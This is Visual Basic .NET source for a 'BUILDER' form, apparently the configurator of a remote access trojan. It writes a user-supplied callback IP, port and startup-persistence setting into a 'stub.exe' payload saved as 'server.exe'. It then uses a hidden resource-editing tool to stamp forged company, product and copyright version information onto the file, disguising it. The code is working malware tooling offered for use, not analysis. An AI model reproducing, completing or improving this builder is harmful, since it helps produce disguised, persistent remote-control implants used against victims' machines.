Imports System.CodeDom.Compiler
Imports System.IO
Public Class BUILDER
    Dim File As String
    Dim splitz As String = "||||SPLITTTT||||"
    Private Sub BunifuButton1_Click(sender As Object, e As EventArgs) Handles BunifuButton1.Click
        Dim sfd As New SaveFileDialog
        sfd.Filter = "Application |*.exe"
        sfd.Title = "Save"
        sfd.FileName = "server"

        If sfd.ShowDialog = Windows.Forms.DialogResult.OK Then
            File = sfd.FileName
            Build2()
            Display_Description(sfd.FileName)
        Else
            Exit Sub
        End If
    End Sub
    Sub Build2()
        Dim ip As String = BunifuTextBox1.Text
        Dim port As String = BunifuTextBox2.Text

        Dim startup As String = "true"

        Dim startupname As String = BunifuTextBox3.Text


        If BunifuCheckBox1.Checked = True Then
            startup = "true"
        Else
            startup = "false"
        End If



        Dim myresourcefullPath As String
        myresourcefullPath = System.IO.Path.GetFullPath(Application.StartupPath & "\") & "stub.exe"
        '      FileOpen(1, Application.StartupPath & "\ENC5.exe", OpenMode.Binary, OpenAccess.Read)
        FileOpen(1, myresourcefullPath, OpenMode.Binary, OpenAccess.Read)
        Dim data As String = Space(LOF(1))

        FileGet(1, data)
        FileClose(1)


        FileOpen(2, File, OpenMode.Binary, OpenAccess.Default)
        FilePut(2, data & splitz & ip & splitz & port & splitz & startup & splitz & startupname)
        FileClose(2)

    End Sub

    Private Sub BunifuButton3_Click(sender As Object, e As EventArgs) Handles BunifuButton3.Click
        Me.Close()
    End Sub

    'Simple Assembly Changer By X-Slayer Adapted
    Private Sub Display_Description(ByVal Name As String)
        Try
            Application.DoEvents()
            If IO.File.Exists(Application.StartupPath & "\res.exe") Then
                IO.File.Delete(Application.StartupPath & "\res.exe")
            End If
            Threading.Thread.Sleep(50)
            IO.File.WriteAllBytes(Application.StartupPath & "\res.exe", My.Resources.Res)
            Threading.Thread.Sleep(50)
            Dim source As String = My.Resources.RHDiscription
            Dim Version = New Collections.Generic.Dictionary(Of String, String) : Version.Add("CompilerVersion", "v2.0")
            Dim Compiler As VBCodeProvider = New VBCodeProvider(Version)
            Dim cResults As CompilerResults
            Dim Settings As New CompilerParameters()

            Dim test As String = BunifuTextBox3.Text



            With Settings
                .GenerateExecutable = True
                .OutputAssembly = Application.StartupPath & "\" & test & ".exe"
                .CompilerOptions = "/target:winexe"
                .ReferencedAssemblies.Add("System.dll")
                .ReferencedAssemblies.Add("System.Windows.Forms.dll")
                .MainClass = "X"
            End With
            source = source.Replace("*Title*", BunifuTextBox3.Text)
            source = source.Replace("*Company*", test)
            source = source.Replace("*Product*", test)
            source = source.Replace("*Copyright*", test)
            source = source.Replace("*Trademark*", test)
            '       source = source.Replace("*version*", N1.Value.ToString & "." & N2.Value.ToString & "." & N3.Value.ToString & "." & N4.Value.ToString)
            '     source = source.Replace("*fversion*", N6.Value.ToString & "." & N7.Value.ToString & "." & N8.Value.ToString & "." & N9.Value.ToString)
            cResults = Compiler.CompileAssemblyFromSource(Settings, source)

            Dim otherfile As String = Application.StartupPath & "\" & test & ".exe"
            Dim resfile As String = Application.StartupPath & "\" & test & ".res"
            Dim mainfile As String = Name

            Shell("res.exe -extract " & otherfile & "," & resfile & ",VERSIONINFO,,", AppWinStyle.Hide, True, -1)
            Shell("res.exe -delete " & mainfile & "," & System.AppDomain.CurrentDomain.BaseDirectory() + "res.exe" & ",VERSIONINFO,,", AppWinStyle.Hide, True, -1)
            Shell("res.exe -addoverwrite " & mainfile & "," & mainfile & "," & resfile & ",VERSIONINFO,1,", AppWinStyle.Hide, True, -1)

            If IO.File.Exists(Application.StartupPath & "\" & test & ".exe") Then
                IO.File.Delete(Application.StartupPath & "\" & test & ".exe")
            End If
            If IO.File.Exists(Application.StartupPath & "\" & test & ".res") Then
                IO.File.Delete(Application.StartupPath & "\" & test & ".res")
            End If
            If IO.File.Exists(Application.StartupPath & "\res.exe") = True Then
                IO.File.Delete(Application.StartupPath & "\res.exe")
            End If
            If IO.File.Exists(Application.StartupPath & "\res.log") = True Then
                IO.File.Delete(Application.StartupPath & "\res.log")
            End If
            If IO.File.Exists(Application.StartupPath & "\res.ini") = True Then
                IO.File.Delete(Application.StartupPath & "\res.ini")
            End If

            MsgBox("Done !", MsgBoxStyle.Information)

        Catch ex As Exception
            MsgBox("Error : A Mistake In Changing Server Description", MsgBoxStyle.Critical, "Information")
        End Try
    End Sub
    Private Sub BUILDER_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub
End Class